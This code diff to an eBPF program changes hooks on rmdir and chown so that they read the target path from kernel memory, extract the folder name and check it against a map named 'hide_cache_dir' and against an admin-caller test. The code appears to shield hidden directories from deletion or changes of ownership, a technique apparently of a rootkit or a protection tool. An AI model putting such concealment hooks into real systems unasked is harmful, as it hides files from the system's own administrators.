@@ -129,14 +129,21 @@ int BPF_PROG(handle_rmdir, const struct path *dir, struct dentry *dentry)
      * Extract folder name.
      */
 
-    char name[MAX_PATH] = {0};
-    if (__extract_dname_from_path((char *)child_path, name, sizeof(name)) < 0)
-	    return 0;
+    char buf[MAX_PATH] = {0};
+    if (bpf_probe_read_kernel_str(buf, sizeof(buf), child_path) < 0)
+        return 0;
 
-    //check in cache.
-    __u8 *flag = bpf_map_lookup_elem(&hide_cache_dir, child_path);
+    char *name = __extract_dname_from_path(buf, sizeof(buf));
+    if (!name)
+        return 0;
+
+    PRINT_DEBUG("Extract name from rmdir command : %s", name);
+
+    __u8 *flag = bpf_map_lookup_elem(&hide_cache_dir, name);
     if(!flag || *flag != 1)
         return 0;
+
+    PRINT_DEBUG("Found occurence in hide_cache_dir for %s", name);
 
     //is stored.
     if(!__is_adm_caller()){
@@ -175,11 +182,14 @@ int handle_chown(unsigned long long *ctx)
      * 
      * For now handling directories.
      */
-    char name[MAX_PATH] = {0};
-    if (__extract_dname_from_path((char *)target_path, name, sizeof(name)) < 0)
-	    return 0;
+    char buf[MAX_PATH] = {0};
+    if (bpf_probe_read_kernel_str(buf, sizeof(buf), target_path) < 0)
+        return 0;
 
-    //check in cache.
+    char *name = __extract_dname_from_path(buf, sizeof(buf));
+    if (!name)
+        return 0;
+
     __u8 *flag = bpf_map_lookup_elem(&hide_cache_dir, name);
     if(!flag || *flag != 1)
         return 0;
